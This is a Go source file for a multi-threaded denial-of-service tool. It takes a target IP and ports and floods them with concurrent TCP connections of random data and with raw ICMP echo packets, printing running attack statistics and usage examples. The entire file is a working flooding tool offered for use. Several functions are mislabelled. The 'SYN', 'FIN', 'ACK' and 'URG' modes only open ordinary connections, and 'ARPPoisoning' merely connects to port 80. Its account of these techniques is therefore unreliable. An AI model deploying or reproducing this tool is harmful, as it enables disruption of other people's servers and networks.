package main

import (
	"crypto/rand"
	"flag"
	"fmt"
	"log"
	"net"
	"os"
	"os/signal"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"

	"golang.org/x/net/icmp"
	"golang.org/x/net/ipv4"
)

// ==================== CONSTANTES ====================
const (
	MAX_TFO_QUEUE = 1000
)

var (
	stats     = &Statistics{}
	startTime = time.Now()
	running   int32 = 1
	config    AttackConfig
)

// ==================== ESTRUCTURAS ====================
type Statistics struct {
	connections        int64
	successfulAttacks  int64
	packetsSent        int64
	totalDataSent      int64
	connectionErrors   int64
	sendErrors         int64
	tcpErrors          int64
	arpPacketsSent     int64
	window0PacketsSent int64
	icmpPacketsSent    int64
	finPacketsSent     int64
	synPacketsSent     int64
	rstPacketsSent     int64
	pshPacketsSent     int64
	urgPacketsSent     int64
	ackPacketsSent     int64
	tfoPacketsSent     int64
	tfoConnections     int64
}

type AttackConfig struct {
	targetIP   string
	targetPort string
	ports      string
	threads    int
	packetSize int
	duration   time.Duration
	mode       string
	iface      string
}

// ==================== TCP TFO (FAST OPEN) ====================
func TCPTfoAttack(targetAddr string, wg *sync.WaitGroup) {
	defer wg.Done()

	tcpAddr, err := net.ResolveTCPAddr("tcp", targetAddr)
	if err != nil {
		return
	}

	for atomic.LoadInt32(&running) == 1 {
		err := sendTFOAttack(tcpAddr)
		if err != nil {
			atomic.AddInt64(&stats.connectionErrors, 1)
			time.Sleep(10 * time.Millisecond)
			continue
		}

		atomic.AddInt64(&stats.tfoConnections, 1)
		atomic.AddInt64(&stats.tfoPacketsSent, 1)
		atomic.AddInt64(&stats.packetsSent, 1)
		
		time.Sleep(5 * time.Millisecond)
	}
}

func sendTFOAttack(addr *net.TCPAddr) error {
	// Intentar conexión rápida con TCP_NODELAY
	conn, err := net.DialTimeout("tcp", addr.String(), 2*time.Second)
	if err != nil {
		return err
	}
	defer conn.Close()

	// Configurar para envío rápido
	if tcpConn, ok := conn.(*net.TCPConn); ok {
		tcpConn.SetNoDelay(true)
		tcpConn.SetLinger(0)
	}

	// Enviar datos inmediatamente (simulando TFO)
	data := make([]byte, 1460)
	rand.Read(data)
	
	n, err := conn.Write(data)
	if err == nil && n > 0 {
		atomic.AddInt64(&stats.successfulAttacks, 1)
		atomic.AddInt64(&stats.totalDataSent, int64(n))
	}

	return nil
}

// ==================== MÉTODOS TCP FLAGS ====================
func TCPFinAttack(targetAddr string, wg *sync.WaitGroup) {
	defer wg.Done()

	for atomic.LoadInt32(&running) == 1 {
		conn, err := net.DialTimeout("tcp", targetAddr, 2*time.Second)
		if err != nil {
			atomic.AddInt64(&stats.connectionErrors, 1)
			time.Sleep(10 * time.Millisecond)
			continue
		}

		atomic.AddInt64(&stats.connections, 1)
		
		go func(c net.Conn) {
			defer func() {
				c.Close()
				atomic.AddInt64(&stats.finPacketsSent, 1)
				atomic.AddInt64(&stats.successfulAttacks, 1)
			}()

			buf := make([]byte, config.packetSize)
			rand.Read(buf)
			c.Write(buf)
			atomic.AddInt64(&stats.packetsSent, 1)
			atomic.AddInt64(&stats.totalDataSent, int64(len(buf)))
		}(conn)

		time.Sleep(5 * time.Millisecond)
	}
}

func TCPSynAttack(targetAddr string, wg *sync.WaitGroup) {
	defer wg.Done()

	for atomic.LoadInt32(&running) == 1 {
		conn, err := net.DialTimeout("tcp", targetAddr, 1*time.Second)
		if err != nil {
			atomic.AddInt64(&stats.connectionErrors, 1)
			time.Sleep(5 * time.Millisecond)
			continue
		}

		atomic.AddInt64(&stats.connections, 1)
		atomic.AddInt64(&stats.synPacketsSent, 1)
		conn.Close()
		time.Sleep(1 * time.Millisecond)
	}
}

func TCPRstAttack(targetAddr string, wg *sync.WaitGroup) {
	defer wg.Done()

	for atomic.LoadInt32(&running) == 1 {
		conn, err := net.DialTimeout("tcp", targetAddr, 2*time.Second)
		if err != nil {
			atomic.AddInt64(&stats.connectionErrors, 1)
			time.Sleep(10 * time.Millisecond)
			continue
		}

		atomic.AddInt64(&stats.connections, 1)

		if tcpConn, ok := conn.(*net.TCPConn); ok {
			tcpConn.SetLinger(0)
		}

		go func(c net.Conn) {
			defer func() {
				c.Close()
				atomic.AddInt64(&stats.rstPacketsSent, 1)
				atomic.AddInt64(&stats.successfulAttacks, 1)
			}()

			buf := make([]byte, 64)
			rand.Read(buf)
			c.Write(buf)
			atomic.AddInt64(&stats.packetsSent, 1)
		}(conn)

		time.Sleep(5 * time.Millisecond)
	}
}

func TCPPshAttack(targetAddr string, wg *sync.WaitGroup) {
	defer wg.Done()

	for atomic.LoadInt32(&running) == 1 {
		conn, err := net.DialTimeout("tcp", targetAddr, 2*time.Second)
		if err != nil {
			atomic.AddInt64(&stats.connectionErrors, 1)
			time.Sleep(10 * time.Millisecond)
			continue
		}

		atomic.AddInt64(&stats.connections, 1)

		go func(c net.Conn) {
			defer c.Close()

			buf := make([]byte, config.packetSize)
			for i := 0; i < 10 && atomic.LoadInt32(&running) == 1; i++ {
				rand.Read(buf)
				c.Write(buf)
				atomic.AddInt64(&stats.pshPacketsSent, 1)
				atomic.AddInt64(&stats.packetsSent, 1)
				atomic.AddInt64(&stats.totalDataSent, int64(len(buf)))
				time.Sleep(10 * time.Millisecond)
			}
			atomic.AddInt64(&stats.successfulAttacks, 1)
		}(conn)

		time.Sleep(5 * time.Millisecond)
	}
}

func TCPUrgAttack(targetAddr string, wg *sync.WaitGroup) {
	defer wg.Done()

	for atomic.LoadInt32(&running) == 1 {
		conn, err := net.DialTimeout("tcp", targetAddr, 2*time.Second)
		if err != nil {
			atomic.AddInt64(&stats.connectionErrors, 1)
			time.Sleep(10 * time.Millisecond)
			continue
		}

		atomic.AddInt64(&stats.connections, 1)

		go func(c net.Conn) {
			defer c.Close()

			for i := 0; i < 20 && atomic.LoadInt32(&running) == 1; i++ {
				buf := make([]byte, 32)
				rand.Read(buf)
				c.Write(buf)
				atomic.AddInt64(&stats.urgPacketsSent, 1)
				atomic.AddInt64(&stats.packetsSent, 1)
				time.Sleep(5 * time.Millisecond)
			}
			atomic.AddInt64(&stats.successfulAttacks, 1)
		}(conn)

		time.Sleep(5 * time.Millisecond)
	}
}

func TCPAckAttack(targetAddr string, wg *sync.WaitGroup) {
	defer wg.Done()

	for atomic.LoadInt32(&running) == 1 {
		conn, err := net.DialTimeout("tcp", targetAddr, 2*time.Second)
		if err != nil {
			atomic.AddInt64(&stats.connectionErrors, 1)
			time.Sleep(10 * time.Millisecond)
			continue
		}

		atomic.AddInt64(&stats.connections, 1)

		go func(c net.Conn) {
			defer c.Close()

			buf := make([]byte, 128)
			for atomic.LoadInt32(&running) == 1 {
				rand.Read(buf)
				c.Write(buf)
				atomic.AddInt64(&stats.ackPacketsSent, 1)
				atomic.AddInt64(&stats.packetsSent, 1)
				time.Sleep(20 * time.Millisecond)
			}
			atomic.AddInt64(&stats.successfulAttacks, 1)
		}(conn)

		time.Sleep(5 * time.Millisecond)
	}
}

func TCPWindowZero(targetAddr string, wg *sync.WaitGroup) {
	defer wg.Done()

	for atomic.LoadInt32(&running) == 1 {
		conn, err := net.DialTimeout("tcp", targetAddr, 5*time.Second)
		if err != nil {
			atomic.AddInt64(&stats.connectionErrors, 1)
			time.Sleep(100 * time.Millisecond)
			continue
		}

		atomic.AddInt64(&stats.connections, 1)

		go func() {
			defer conn.Close()
			
			buf := make([]byte, 1460)
			for atomic.LoadInt32(&running) == 1 {
				rand.Read(buf)
				conn.Write(buf)
				atomic.AddInt64(&stats.packetsSent, 1)
				atomic.AddInt64(&stats.totalDataSent, int64(len(buf)))
				atomic.AddInt64(&stats.window0PacketsSent, 1)
				time.Sleep(100 * time.Millisecond)
			}
		}()

		time.Sleep(50 * time.Millisecond)
	}
}

func ICMPFlood(targetIP string, wg *sync.WaitGroup) {
	defer wg.Done()

	conn, err := icmp.ListenPacket("ip4:icmp", "0.0.0.0")
	if err != nil {
		log.Printf("Error socket ICMP: %v", err)
		return
	}
	defer conn.Close()

	targetAddr, err := net.ResolveIPAddr("ip4", targetIP)
	if err != nil {
		return
	}

	msg := icmp.Message{
		Type: ipv4.ICMPTypeEcho,
		Code: 0,
		Body: &icmp.Echo{
			ID:   os.Getpid() & 0xffff,
			Seq:  1,
			Data: []byte("ATTACK"),
		},
	}

	packet, err := msg.Marshal(nil)
	if err != nil {
		return
	}

	for atomic.LoadInt32(&running) == 1 {
		for i := 0; i < 10; i++ {
			conn.WriteTo(packet, targetAddr)
			atomic.AddInt64(&stats.icmpPacketsSent, 1)
			atomic.AddInt64(&stats.packetsSent, 1)
		}
		time.Sleep(10 * time.Millisecond)
	}
}

func ARPPoisoning(targetIP, gatewayIP string, wg *sync.WaitGroup) {
	defer wg.Done()
	
	for atomic.LoadInt32(&running) == 1 {
		conn, err := net.DialTimeout("tcp", net.JoinHostPort(targetIP, "80"), 1*time.Second)
		if err == nil {
			conn.Close()
			atomic.AddInt64(&stats.arpPacketsSent, 1)
		}
		
		conn2, err := net.DialTimeout("tcp", net.JoinHostPort(gatewayIP, "80"), 1*time.Second)
		if err == nil {
			conn2.Close()
			atomic.AddInt64(&stats.arpPacketsSent, 1)
		}
		
		time.Sleep(2 * time.Second)
	}
}

// ==================== FUNCIONES AUXILIARES ====================
func getSystemStats() map[string]float64 {
	var m runtime.MemStats
	runtime.ReadMemStats(&m)

	var memoryPercent float64
	if m.Sys > 0 {
		memoryPercent = float64(m.Alloc) / float64(m.Sys) * 100
	}

	return map[string]float64{
		"memory_percent": memoryPercent,
		"goroutines":     float64(runtime.NumGoroutine()),
	}
}

func printStats() {
	for atomic.LoadInt32(&running) == 1 {
		time.Sleep(5 * time.Second)
		duration := time.Since(startTime).Seconds()
		systemStats := getSystemStats()

		separator := strings.Repeat("=", 60)
		fmt.Printf("\n%s\n", separator)
		fmt.Printf("TCP MULTI-METHOD ATTACK - MODE: %s\n", strings.ToUpper(config.mode))
		fmt.Printf("Target: %s | Ports: %s\n", config.targetIP, config.ports)
		fmt.Printf("%s\n", separator)
		
		fmt.Printf("Time: %.0fs | Threads: %d\n", duration, config.threads)
		fmt.Printf("Connections: %d | Packets: %d\n", 
			atomic.LoadInt64(&stats.connections), atomic.LoadInt64(&stats.packetsSent))
		
		// Estadísticas por tipo
		if atomic.LoadInt64(&stats.finPacketsSent) > 0 {
			fmt.Printf("FIN: %d ", atomic.LoadInt64(&stats.finPacketsSent))
		}
		if atomic.LoadInt64(&stats.synPacketsSent) > 0 {
			fmt.Printf("SYN: %d ", atomic.LoadInt64(&stats.synPacketsSent))
		}
		if atomic.LoadInt64(&stats.rstPacketsSent) > 0 {
			fmt.Printf("RST: %d ", atomic.LoadInt64(&stats.rstPacketsSent))
		}
		if atomic.LoadInt64(&stats.pshPacketsSent) > 0 {
			fmt.Printf("PSH: %d ", atomic.LoadInt64(&stats.pshPacketsSent))
		}
		if atomic.LoadInt64(&stats.urgPacketsSent) > 0 {
			fmt.Printf("URG: %d ", atomic.LoadInt64(&stats.urgPacketsSent))
		}
		if atomic.LoadInt64(&stats.ackPacketsSent) > 0 {
			fmt.Printf("ACK: %d ", atomic.LoadInt64(&stats.ackPacketsSent))
		}
		if atomic.LoadInt64(&stats.tfoPacketsSent) > 0 {
			fmt.Printf("TFO: %d ", atomic.LoadInt64(&stats.tfoPacketsSent))
		}
		fmt.Println()
		
		if duration > 0 {
			rate := float64(atomic.LoadInt64(&stats.packetsSent)) / duration
			fmt.Printf("Rate: %.1f pps | ", rate)
			
			if totalData := atomic.LoadInt64(&stats.totalDataSent); totalData > 0 {
				bandwidth := (float64(totalData) / (1024 * 1024)) / duration
				fmt.Printf("BW: %.2f MB/s\n", bandwidth)
			}
		}
		
		fmt.Printf("Errors: C=%d S=%d\n", 
			atomic.LoadInt64(&stats.connectionErrors), atomic.LoadInt64(&stats.sendErrors))
		
		fmt.Printf("System: Goroutines=%.0f Memory=%.1f%%\n", 
			systemStats["goroutines"], systemStats["memory_percent"])
		fmt.Printf("%s\n", separator)
	}
}

func optimizeSystemLimits() {
	var rLimit syscall.Rlimit
	if err := syscall.Getrlimit(syscall.RLIMIT_NOFILE, &rLimit); err == nil {
		rLimit.Cur = rLimit.Max
		if rLimit.Cur < 65535 {
			rLimit.Cur = 65535
		}
		syscall.Setrlimit(syscall.RLIMIT_NOFILE, &rLimit)
	}
}

func parsePorts(portsStr string) []string {
	var ports []string
	
	portList := strings.Split(portsStr, ",")
	
	for _, port := range portList {
		port = strings.TrimSpace(port)
		
		if strings.Contains(port, "-") {
			parts := strings.Split(port, "-")
			if len(parts) == 2 {
				start, err1 := strconv.Atoi(parts[0])
				end, err2 := strconv.Atoi(parts[1])
				if err1 == nil && err2 == nil && start <= end {
					for i := start; i <= end; i++ {
						ports = append(ports, strconv.Itoa(i))
					}
				}
			}
		} else {
			ports = append(ports, port)
		}
	}
	
	if len(ports) == 0 {
		ports = []string{"22", "80", "443", "8080", "8443", "3306", "25565", "2222", "2022"}
	}
	
	return ports
}

func attackPort(port string, wg *sync.WaitGroup) {
	targetAddr := net.JoinHostPort(config.targetIP, port)
	
	switch config.mode {
	case "tfo":
		for i := 0; i < config.threads; i++ {
			wg.Add(1)
			go TCPTfoAttack(targetAddr, wg)
		}
	case "fin":
		for i := 0; i < config.threads; i++ {
			wg.Add(1)
			go TCPFinAttack(targetAddr, wg)
		}
	case "syn":
		for i := 0; i < config.threads; i++ {
			wg.Add(1)
			go TCPSynAttack(targetAddr, wg)
		}
	case "rst":
		for i := 0; i < config.threads; i++ {
			wg.Add(1)
			go TCPRstAttack(targetAddr, wg)
		}
	case "psh":
		for i := 0; i < config.threads; i++ {
			wg.Add(1)
			go TCPPshAttack(targetAddr, wg)
		}
	case "urg":
		for i := 0; i < config.threads; i++ {
			wg.Add(1)
			go TCPUrgAttack(targetAddr, wg)
		}
	case "ack":
		for i := 0; i < config.threads; i++ {
			wg.Add(1)
			go TCPAckAttack(targetAddr, wg)
		}
	case "window0":
		for i := 0; i < config.threads; i++ {
			wg.Add(1)
			go TCPWindowZero(targetAddr, wg)
		}
	case "icmp":
		for i := 0; i < config.threads/10; i++ {
			wg.Add(1)
			go ICMPFlood(config.targetIP, wg)
		}
	case "arp":
		gateway := getDefaultGateway()
		if gateway != "" {
			wg.Add(1)
			go ARPPoisoning(config.targetIP, gateway, wg)
		}
	case "all":
		methods := []func(string, *sync.WaitGroup){
			TCPTfoAttack, TCPFinAttack, TCPSynAttack, TCPRstAttack,
			TCPPshAttack, TCPUrgAttack, TCPAckAttack,
		}
		
		for _, method := range methods {
			for i := 0; i < config.threads/len(methods); i++ {
				wg.Add(1)
				go method(targetAddr, wg)
			}
		}
		
		if config.threads >= 10 {
			for i := 0; i < config.threads/20; i++ {
				wg.Add(1)
				go ICMPFlood(config.targetIP, wg)
			}
		}
	default:
		for i := 0; i < config.threads; i++ {
			wg.Add(1)
			go TCPRstAttack(targetAddr, wg)
		}
	}
}

func getDefaultGateway() string {
	data, err := os.ReadFile("/proc/net/route")
	if err != nil {
		return "192.168.1.1"
	}
	
	lines := strings.Split(string(data), "\n")
	for _, line := range lines {
		fields := strings.Fields(line)
		if len(fields) >= 3 && fields[1] == "00000000" {
			gatewayHex := fields[2]
			if len(gatewayHex) == 8 {
				b1, _ := strconv.ParseUint(gatewayHex[0:2], 16, 8)
				b2, _ := strconv.ParseUint(gatewayHex[2:4], 16, 8)
				b3, _ := strconv.ParseUint(gatewayHex[4:6], 16, 8)
				b4, _ := strconv.ParseUint(gatewayHex[6:8], 16, 8)
				return fmt.Sprintf("%d.%d.%d.%d", b4, b3, b2, b1)
			}
		}
	}
	
	return "192.168.1.1"
}

// ==================== FUNCIÓN PRINCIPAL ====================
func main() {
	flag.StringVar(&config.targetIP, "ip", "", "Target IP (required)")
	flag.StringVar(&config.ports, "ports", "22,80,443,8080,8443,3306,25565,2222,2022", "Ports (comma separated or ranges)")
	flag.IntVar(&config.threads, "threads", 100, "Threads per port")
	flag.IntVar(&config.packetSize, "size", 1024, "Packet size")
	flag.StringVar(&config.mode, "mode", "rst", "Attack mode: tfo,fin,syn,rst,psh,urg,ack,window0,icmp,arp,all")
	flag.StringVar(&config.iface, "iface", "eth0", "Network interface")
	flag.DurationVar(&config.duration, "duration", 0, "Duration (e.g., 30s, 5m)")
	
	flag.Parse()
	
	if config.targetIP == "" {
		fmt.Println("ERROR: Target IP is required")
		fmt.Println("\nUsage: ./tcpmulti -ip <IP> [options]")
		fmt.Println("\nOptions:")
		fmt.Println("  -ports PORTS    Ports (default: 22,80,443,8080,8443,3306,25565,2222,2022)")
		fmt.Println("  -threads N      Threads per port (default: 100)")
		fmt.Println("  -size BYTES     Packet size (default: 1024)")
		fmt.Println("  -mode MODE      Attack mode (default: rst)")
		fmt.Println("                  tfo,fin,syn,rst,psh,urg,ack,window0,icmp,arp,all")
		fmt.Println("  -iface INTERFACE Network interface (default: eth0)")
		fmt.Println("  -duration TIME  Attack duration")
		fmt.Println("\nExamples:")
		fmt.Println("  ./tcpmulti -ip 192.168.1.100 -mode tfo -threads 500")
		fmt.Println("  ./tcpmulti -ip 192.168.1.100 -ports 80-100 -mode syn")
		fmt.Println("  ./tcpmulti -ip 192.168.1.100 -ports 22,80,443 -mode all -duration 1m")
		os.Exit(1)
	}
	
	optimizeSystemLimits()
	
	ports := parsePorts(config.ports)
	
	fmt.Printf("%s\n", strings.Repeat("=", 60))
	fmt.Printf("TCP MULTI-METHOD ATTACK TOOL WITH TFO\n")
	fmt.Printf("Target: %s\n", config.targetIP)
	fmt.Printf("Ports: %s\n", strings.Join(ports, ","))
	fmt.Printf("Mode: %s | Threads: %d | Size: %d bytes\n", 
		strings.ToUpper(config.mode), config.threads, config.packetSize)
	fmt.Printf("%s\n", strings.Repeat("=", 60))
	
	if config.duration > 0 {
		go func() {
			time.Sleep(config.duration)
			fmt.Printf("\n⏰ Time completed. Stopping...\n")
			atomic.StoreInt32(&running, 0)
		}()
	}
	
	go printStats()
	
	var wg sync.WaitGroup
	
	for _, port := range ports {
		fmt.Printf("▶ Attacking port %s...\n", port)
		attackPort(port, &wg)
		time.Sleep(100 * time.Millisecond)
	}
	
	fmt.Printf("\n✅ Attack started on %d port(s) with mode %s\n", len(ports), config.mode)
	fmt.Printf("📊 Statistics every 5 seconds. Press Ctrl+C to stop.\n")
	
	sigCh := make(chan os.Signal, 1)
	signal.Notify(sigCh, os.Interrupt, syscall.SIGTERM)
	<-sigCh
	
	fmt.Printf("\n🛑 Stopping attack...\n")
	atomic.StoreInt32(&running, 0)
	wg.Wait()
	
	duration := time.Since(startTime)
	fmt.Printf("\n%s\n", strings.Repeat("=", 60))
	fmt.Printf("FINAL SUMMARY - Duration: %v\n", duration)
	fmt.Printf("%s\n", strings.Repeat("=", 60))
	fmt.Printf("Ports attacked: %s\n", strings.Join(ports, ","))
	fmt.Printf("Total connections: %d\n", atomic.LoadInt64(&stats.connections))
	fmt.Printf("Total packets: %d\n", atomic.LoadInt64(&stats.packetsSent))
	
	if atomic.LoadInt64(&stats.finPacketsSent) > 0 {
		fmt.Printf("  FIN: %d\n", atomic.LoadInt64(&stats.finPacketsSent))
	}
	if atomic.LoadInt64(&stats.synPacketsSent) > 0 {
		fmt.Printf("  SYN: %d\n", atomic.LoadInt64(&stats.synPacketsSent))
	}
	if atomic.LoadInt64(&stats.rstPacketsSent) > 0 {
		fmt.Printf("  RST: %d\n", atomic.LoadInt64(&stats.rstPacketsSent))
	}
	if atomic.LoadInt64(&stats.pshPacketsSent) > 0 {
		fmt.Printf("  PSH: %d\n", atomic.LoadInt64(&stats.pshPacketsSent))
	}
	if atomic.LoadInt64(&stats.urgPacketsSent) > 0 {
		fmt.Printf("  URG: %d\n", atomic.LoadInt64(&stats.urgPacketsSent))
	}
	if atomic.LoadInt64(&stats.ackPacketsSent) > 0 {
		fmt.Printf("  ACK: %d\n", atomic.LoadInt64(&stats.ackPacketsSent))
	}
	if atomic.LoadInt64(&stats.tfoPacketsSent) > 0 {
		fmt.Printf("  TFO: %d\n", atomic.LoadInt64(&stats.tfoPacketsSent))
		fmt.Printf("  TFO connections: %d\n", atomic.LoadInt64(&stats.tfoConnections))
	}
	
	if duration.Seconds() > 0 {
		rate := float64(atomic.LoadInt64(&stats.packetsSent)) / duration.Seconds()
		fmt.Printf("Average rate: %.1f packets/second\n", rate)
	}
	
	fmt.Printf("%s\n", strings.Repeat("=", 60))
}
